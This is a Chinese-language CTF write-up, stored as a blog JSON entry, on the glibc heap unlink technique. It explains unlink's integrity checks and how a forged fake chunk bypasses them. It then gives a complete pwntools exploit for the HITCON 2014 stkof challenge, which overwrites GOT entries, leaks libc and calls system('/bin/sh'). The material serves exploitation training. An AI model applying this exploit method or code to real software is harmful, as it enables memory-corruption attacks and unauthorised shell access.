[{"title":"Unlink","url":"/2025/06/17/Unlink/","content":"\n\n一、 Unlink介绍Unlink被定义为一个宏（高版本libc中被定义为了静态函数 unlink_chunk)，其源码如下\n/*  * 从双向链表中安全移除节点P的宏 * AV: 分配区指针，用于错误处理 * P: 要移除的节点指针 * BK: 临时存储后驱节点指针 * FD: 临时存储前驱节点指针 */#define unlink(AV, P, BK, FD) &#123;                                                /* 获取P的前驱和后继节点 */                                          FD = P-&gt;fd;\t\t\t\t\t\t\t\t          BK = P-&gt;bk;\t\t\t\t\t\t\t\t              /* 验证前后节点指针的完整性：前驱的后继和后继的前驱必须都指向P */    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))\t\t            malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);          /* 链表完整性验证通过，执行移除操作 */          else &#123;\t\t\t\t\t\t\t\t              /* 基本链表操作：让前驱和后继互相指向，跳过P */          FD-&gt;bk = BK;\t\t\t\t\t\t\t              BK-&gt;fd = FD;\t\t\t\t\t\t\t                      /* 处理非small bin的特殊情况（large bins可能有额外的大小链表） */        if (!in_smallbin_range (P-&gt;size)\t\t\t\t                  &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;\t\t                  /* 检查大小链表的完整性 */\t    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)\t      \t\t|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \t      malloc_printerr (check_action,\t\t\t\t      \t\t\t       &quot;corrupted double-linked list (not small)&quot;,    \t\t\t       P, AV);\t\t\t\t\t                              /* 如果后继节点的大小链表指针为空，需要重建 */                  if (FD-&gt;fd_nextsize == NULL) &#123;\t\t\t\t                      /* 情况1：P是唯一节点，让后继节点自环 */                      if (P-&gt;fd_nextsize == P)\t\t\t\t                        FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;\t\t                      /* 情况2：将P的大小链表指针转移给后继节点 */                else &#123;\t\t\t\t\t\t\t                          FD-&gt;fd_nextsize = P-&gt;fd_nextsize;\t\t\t                          FD-&gt;bk_nextsize = P-&gt;bk_nextsize;\t\t\t                          P-&gt;fd_nextsize-&gt;bk_nextsize = FD; /* 更新后节点的后驱 */                          P-&gt;bk_nextsize-&gt;fd_nextsize = FD; /* 更新前节点的前驱 */                        &#125;\t\t\t\t\t\t\t                    &#125;             /* 如果后继已有大小链表指针，直接跳过P */                  else &#123;\t\t\t\t\t\t\t                      P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;\t\t                      P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;\t\t                    &#125;\t\t\t\t\t\t\t\t                &#125;\t\t\t\t\t\t\t\t            &#125;\t\t\t\t\t\t\t\t\t      &#125;\nUnlink是堆管理中的一个操作，用于将一个chunk从双向链表中取出。触发unlink，往往是通过free物理相邻的下一块chunk，检查到该chunk的上一块处于free状态（size的prev_inuse为0)，就用unlink将上一块脱链后合并。\n实现过程如下图。（图画的丑陋，别喷）当我们执行Unlink将chunk2从双向链表中取出的时候，这个双向链表就变成下面这个样子。\n漏洞点： 如果我们可以伪造chunk2，通过控制fd和bk的值，我们似乎就可以实现任意地址写。但是事情并非如此简单，通过上面给出的源码可以看到，Unlink内部做了许多保护和限制，下面我们就来研究这些保护以及限制。\n二、 保护和限制1. chunksize(P) &#x3D;&#x3D; prev_size(next_chunk(P))这部分检测源码如下：\n/* 获取下一个块的指针 */nextchunk = chunk_at_offset(p, size);/* 检查下一个块的prev_size是否等于当前块size */if (__builtin_expect(nextchunk-&gt;prev_size != size, 0))    malloc_printerr(&quot;corrupted size vs. prev_size&quot;);\n\n这部分检测检查的是下一个chunk的prev_size是否和当前堆块的prev_size相等（这是free函数中的检测）\n\n2. fd-&gt;bk &#x3D;&#x3D; P &amp;&amp; bk -&gt; fd &#x3D;&#x3D; P这部分检测源码如下：\n/* 验证前后节点指针的完整性：前驱的后继和后继的前驱必须都指向P */  if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))\t\t          malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);      /* 链表完整性验证通过，执行移除操作 */        else &#123;\t\t\t\t\t\t\t\t            /* 基本链表操作：让前驱和后继互相指向，跳过P */        FD-&gt;bk = BK;\t\t\t\t\t\t\t            BK-&gt;fd = FD;\t\t\t\t\t\t\t     \n其实就是在检测这个双向链表的结构是否完整。\n3. not small这部分检测源码如下：\n/* 处理非small bin的特殊情况（large bins可能有额外的大小链表） */      if (!in_smallbin_range (P-&gt;size)\t\t\t\t                &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;\t\t                /* 检查大小链表的完整性 */   if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)\t      || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))         malloc_printerr (check_action,\t\t\t\t      \t       &quot;corrupted double-linked list (not small)&quot;,    \t       P, AV);\t\t\t\t\t      \n简单来说，如果chunk的大小落在largebin范围内，就会进行对nextsize的检查\n三、 适用场景及绕过方法适用场景（一般来说）\n有一个list专门用于存户malloc得到的指针\n存在溢出漏洞\n\n保护绕过（以上面讲的适用场景为例）保护1通过溢出，对下一个堆块进行修改，使得下一个堆块的prev_size &#x3D; fackchcunk的size，prev_inuse &#x3D; 0保护2对于保护2，可以通过构造facck chunk来绕过。chunk_list存在的时候，我们做以下构造fack chunk的fd指向 存放当前堆块指针的地址 -0x18（bk指针相对于chunk头的偏移是0x18)fack chunk的bk指向 存放当前堆块指针的地址 -0x10（fd指针相对于chunk头的偏移是0x10)这样就实现了 fack_chunk的fd指向的“chunk”的bk指向它，fack_chunk的bk指向的“chunk”指向它，从而成功绕过检测。\nfakeFD -&gt; bk == P1 *(&amp;fakeFD + 0x18) == P1 *fakeFD == &amp;P1 - 0x18fakeBK -&gt; fd == P1 *(&amp;fakeBK + 0x10) == P1 *fakeBK == &amp;P1 - 0x10\n保护3更简单了，直接不申请largebin大小的chunk即可。\n四、 例题分析题目来源：[2014_hitccon_stkof]先检查一下保护，看一下文件的ELF信息\n可以看到是64位小端序，开启了canary和nx，got表可写\n丢到ida里面看一看（为了方便查看，改了一些函数和变量的名字）main函数\ncreat函数\ndelete函数\nedit函数\n还有一个没什么用的函数，这里就不管他了。\n通过分析程序的主要函数，我们发现申请的堆块的指针都在存放在bss段的一个数组（后面叫做list）中，并且edit函数输入的字节数目由我们自己控制，所以存在溢出。所以这道题可以用unlink来做。前置准备：\ndef cmd(choicce):    p.sendline(str(choicce).encode())def add(size):    cmd(1)    p.sendline(str(size).encode())def edit(index,size,content):    cmd(2)    p.sendline(str(index).encode())    p.sendline(str(size).encode())    p.send(content)def delete(index):    cmd(3)    p.sendline(str(index).encode())\n所以思路就很清晰了：我们先申请四个堆块（第一个用后续操作，第二个就是我们用来制作fack chunk的，第三个用来触发unlink，堆块四用来chunk防止与top chunk合并）\nadd(0x80)# 1   p.recvuntil(b&#x27;OK\\n&#x27;)add(0x80)# 2p.recvuntil(b&#x27;OK\\n&#x27;)add(0x80)# 3   p.recvuntil(b&#x27;OK\\n&#x27;)add(0x20)# 4\n\n然后通过edit第二个堆块来制造fack chunk并溢出到第三个堆块，修改他的prev_size和prev_inuse\nchunks =  0x602140aim = chunks + 0x10#chunk2_addrfd = aim - 0x18bk = aim - 0x10#fake_chunkp.recvuntil(b&#x27;OK\\n&#x27;)payload1 = p64(0) + p64(0x81) + p64(fd) + p64(bk) + b&#x27;a&#x27;*0x60 + p64(0x80) + p64(0x90)edit(2,0x90,payload1)\n此时，chunk2内存是这样的\n接着free第三个堆块触发unlink，这个时候原来存放第二个堆块的指针(list[2])的位置就被写入了 &amp;list -0x8\n后面我们就可以通过edit堆块2去修改list中存放的值，我们将chunk_list[1]、chunk_list[2]、chunk_list[3]的值分别改为free、puts、atoi的got表地址然后通过edit堆块1，实现修改free_got为 puts_plt ，然后free堆块2就能泄露puts函数的真实地址，据此算出libc_base然后edit堆块3将atoi_got改为system的地址，最后输入/bin/sh就能getshell\n完整的exp如下\nfrom pwn import *context(log_level=&#x27;debug&#x27; , os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)pwnfile = &#x27;./pwn&#x27;elf = ELF(pwnfile)libc = elf.libcis_remote = 0if (remote):    p = remote(&#x27;node5.buuoj.cn&#x27;, 26221)else:    p = process(pwnfile)def cmd(choicce):    p.sendline(str(choicce).encode())def add(size):    cmd(1)    p.sendline(str(size).encode())def edit(index,size,content):    cmd(2)    p.sendline(str(index).encode())    p.sendline(str(size).encode())    p.send(content)def delete(index):    cmd(3)    p.sendline(str(index).encode())if __name__ == &#x27;__main__&#x27;:    chunks =  0x602140    aim = chunks + 0x10    fd = aim - 0x18    bk = aim - 0x10        puts_plt = elf.plt[&#x27;puts&#x27;]    free_got = elf.got[&#x27;free&#x27;]    fread_got = elf.got[&#x27;fread&#x27;]    puts_got = elf.got[&#x27;puts&#x27;]    atoi_got = elf.got[&#x27;atoi&#x27;]        add(0x80)#       p.recvuntil(b&#x27;OK\\n&#x27;)    add(0x80)#        p.recvuntil(b&#x27;OK\\n&#x27;)    add(0x80)#       p.recvuntil(b&#x27;OK\\n&#x27;)    add(0x20)#     #gdb.attach(p)    #fake_chunk        p.recvuntil(b&#x27;OK\\n&#x27;)    payload1 = p64(0) + p64(0x81) + p64(fd) + p64(bk) + b&#x27;a&#x27;*0x60 + p64(0x80) + p64(0x90)    edit(2,0x90,payload1)        p.recvuntil(b&#x27;OK\\n&#x27;)    delete(3)    p.recvuntil(b&#x27;OK\\n&#x27;)    payload2 = b&#x27;a&#x27;*0x10 + p64(free_got) + p64(puts_got) + p64(atoi_got)     edit( 2 , len(payload2) , payload2)    p.recvuntil(b&#x27;OK\\n&#x27;)    edit( 1 , 0x8 , p64(puts_plt))        p.recvuntil(b&#x27;OK\\n&#x27;)    delete(2)    puts_addr = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))    success(&quot;puts_addr: &quot; + hex(puts_addr))    libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]    success(&quot;libc_base: &quot; + hex(libc_base))    system_addr = libc_base + libc.symbols[&#x27;system&#x27;]    success(&quot;system_addr: &quot; + hex(system_addr))    #gdb.attach(p)    p.recvuntil(b&#x27;OK\\n&#x27;)    edit( 3 , 0x8 , p64(system_addr))        pause()    p.sendline(b&#x27;/bin/sh\\x00&#x27;)    p.interactive()","categories":["PWN"],"tags":["heap","unlink"]}]